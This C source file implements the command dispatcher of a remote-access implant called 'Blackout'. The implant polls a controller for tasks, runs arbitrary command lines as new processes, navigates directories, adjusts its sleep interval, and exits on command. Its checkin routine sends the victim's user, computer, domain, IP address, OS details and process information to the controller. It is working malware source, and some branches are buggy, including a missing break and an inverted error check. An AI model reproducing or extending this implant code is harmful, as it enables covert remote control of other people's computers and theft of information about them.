#include <Common.h>

FUNC VOID CommandDispatcher(
    void
) {
    BLACKOUT_INSTANCE

    Instance()->Commands[ 0 ] = { .ID = BLACKOUT_CHECKIN, .Function = CommandCheckin };
    Instance()->Commands[ 1 ] = { .ID = COMMAND_RUN,      .Function = CommandRun };
    Instance()->Commands[ 2 ] = { .ID = COMMAND_EXPLORER, .Function = CommandExplorer };
    Instance()->Commands[ 3 ] = { .ID = COMMAND_SLEEP,    .Function = CommandSleep };
    Instance()->Commands[ 4 ] = { .ID = COMMAND_EXITP,    .Function = CommandExitProcess };
    Instance()->Commands[ 5 ] = { .ID = COMMAND_EXITT,    .Function = CommandExitThread };

    PPACKAGE Package     = NULL;
    PARSER   Parser      = { 0 };
    PVOID    DataBuffer  = NULL;
    SIZE_T   DataSize    = 0;
    DWORD    TaskCommand = 0;

    BK_PRINT( "Command Dispatcher...\n" );

    do
    {
        if ( !Instance()->Session.Connected )
            return;

        SleepMain( Instance()->Session.SleepTime * 1000 );

        Package = PackageCreate( COMMAND_GET_JOB );

        PackageAddInt32( Package, Instance()->Session.AgentId );
        PackageTransmit( Package, &DataBuffer, &DataSize );

        if ( DataBuffer && DataSize > 0 ) {
            ParserNew( &Parser, DataBuffer, DataSize );
            do
            {
                TaskCommand = ParserGetInt32( &Parser );

                if ( TaskCommand != COMMAND_NO_JOB )
                {
                    BK_PRINT( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );

                    BOOL FoundCommand = FALSE;
                    for ( UINT32 FunctionCounter = 0; FunctionCounter < BLACKOUT_COMMAND_LENGTH; FunctionCounter++ )
                    {
                        BK_PRINT( "Task => CommandID:[%lu : %lx]\n", TaskCommand, Instance()->Commands[ FunctionCounter ].ID );
                        if ( Instance()->Commands[ FunctionCounter ].ID == TaskCommand )
                        {
                            Instance()->Commands[ FunctionCounter ].Function( &Parser );
                            FoundCommand = TRUE;
                            break;
                        }
                    }

                    if ( ! FoundCommand )
                        BK_PRINT( "Command not found !!\n" );

                } else BK_PRINT( "Is COMMAND_NO_JOB\n" );

            } while ( Parser.Length > 4 );

            MmSet( DataBuffer, 0, DataSize );
            Instance()->Win32.LocalFree( *( PVOID* ) DataBuffer );
            DataBuffer = NULL;

            ParserDestroy( &Parser );
        }
        else
        {
            BK_PRINT( "Transport: Failed\n" );
            break;
        }

    } while ( TRUE );

    Instance()->Session.Connected = FALSE;
}

FUNC VOID CommandRun(
    _In_ PPARSER Parser
) {
    BLACKOUT_INSTANCE

    BK_PACKAGE = PackageCreate( COMMAND_RUN );
    PSTR     ProcCmd       = ParserGetString( Parser, NULL );
    DWORD    ProcessId     = 0;
    DWORD    ThreadId      = 0;
    HANDLE   ProcessHandle = NULL;
    HANDLE   ThreadHandle  = NULL;
    BOOL     bCheck        = FALSE;

    bCheck = bkCreateProcess( ProcCmd, TRUE, NULL, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId );
    if ( !bCheck )
        return;

    PackageAddBool(  BK_PACKAGE, bCheck     );
    PackageAddInt32( BK_PACKAGE, ProcessId  );
    PackageAddInt32( BK_PACKAGE, ThreadId   );
    PackageTransmit( BK_PACKAGE, NULL, NULL );
}

FUNC VOID CommandExplorer(
    _In_ PPARSER Parser
) {
    BLACKOUT_INSTANCE

    EXPLR Explorer = ParserGetInt32( Parser );
    BOOL  bCheck   = FALSE;

    BK_PACKAGE = PackageCreate( COMMAND_EXPLORER );
    
    switch ( Explorer )
    {
    case CD: {
        PSTR DestDir = ParserGetString( Parser, NULL ); 
        bCheck = Instance()->Win32.SetCurrentDirectoryA( DestDir );
        if ( bCheck )
            PackageTransmitError( NtLastError() );

        PackageAddInt32( BK_PACKAGE, CD );
        PackageTransmit( BK_PACKAGE, NULL, NULL );
    }
    case PWD: {
        CHAR CurDir[MAX_PATH];
        bCheck = Instance()->Win32.GetCurrentDirectoryA( MAX_PATH, CurDir );
        if ( !bCheck )
            PackageTransmitError( NtLastError() );
        
        PackageAddInt32( BK_PACKAGE, PWD );
        PackageAddString( BK_PACKAGE, CurDir );
        PackageTransmit( BK_PACKAGE, NULL, NULL );
    }
    
    default:
        break;
    }
}

FUNC VOID CommandCheckin(
    _In_ PPARSER Parser
) {
    BLACKOUT_INSTANCE

    BK_PACKAGE = PackageCreate( BLACKOUT_CHECKIN );

    PackageAddInt32( BK_PACKAGE, Instance()->Base.Buffer  );
    PackageAddInt32( BK_PACKAGE, Instance()->Base.Length  );
    PackageAddInt32( BK_PACKAGE, Instance()->Base.FullLen );
    PackageAddInt32( BK_PACKAGE, Instance()->Base.RxBase  );
    PackageAddInt32( BK_PACKAGE, Instance()->Base.RxSize  );

    PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessName     );
    PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessFullPath );
    PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessCmdLine  );
    PackageAddInt32(   BK_PACKAGE, Instance()->Session.ProcessId       );
    PackageAddInt32(   BK_PACKAGE, Instance()->Session.ParentProcId    );

    PackageAddString( BK_PACKAGE, Instance()->System.UserName      );
    PackageAddString( BK_PACKAGE, Instance()->System.ComputerName  );
    PackageAddString( BK_PACKAGE, Instance()->System.DomainName    );
    PackageAddString( BK_PACKAGE, Instance()->System.NetBios       );
    PackageAddString( BK_PACKAGE, Instance()->System.IpAddress     );
    PackageAddInt32(  BK_PACKAGE, Instance()->System.OsArch        );
    PackageAddInt32(  BK_PACKAGE, Instance()->System.ProductType   );
    PackageAddInt32(  BK_PACKAGE, Instance()->System.OsMajorV      );
    PackageAddInt32(  BK_PACKAGE, Instance()->System.OsMinorv      );
    PackageAddInt32(  BK_PACKAGE, Instance()->System.OsBuildNumber );

    PackageAddWString( BK_PACKAGE, Instance()->Transport.Host      );
    PackageAddInt32(   BK_PACKAGE, Instance()->Transport.Port      );
    PackageAddWString( BK_PACKAGE, Instance()->Transport.UserAgent );

    PackageTransmit( BK_PACKAGE, NULL, NULL );
}

FUNC VOID CommandSleep(
    PPARSER Parser
) {
    BLACKOUT_INSTANCE

    BK_PACKAGE = PackageCreate( COMMAND_SLEEP );

    DWORD SleepTime = ParserGetInt32( Parser );

    BK_PRINT( "%d\n", SleepTime );

    Instance()->Session.SleepTime = SleepTime;

    PackageAddInt32( BK_PACKAGE, SleepTime );
    PackageTransmit( BK_PACKAGE, NULL, NULL ); 
}

FUNC VOID CommandExitProcess(
    PPARSER Parser
) {
    BLACKOUT_INSTANCE

    BK_PACKAGE = PackageCreate( COMMAND_EXITP );

    Instance()->Win32.RtlExitUserProcess( 0 );
}

FUNC VOID CommandExitThread(
    PPARSER Parser
) {
    BLACKOUT_INSTANCE

    BK_PACKAGE = PackageCreate( COMMAND_EXITT );

    Instance()->Win32.RtlExitUserThread( 0 );
}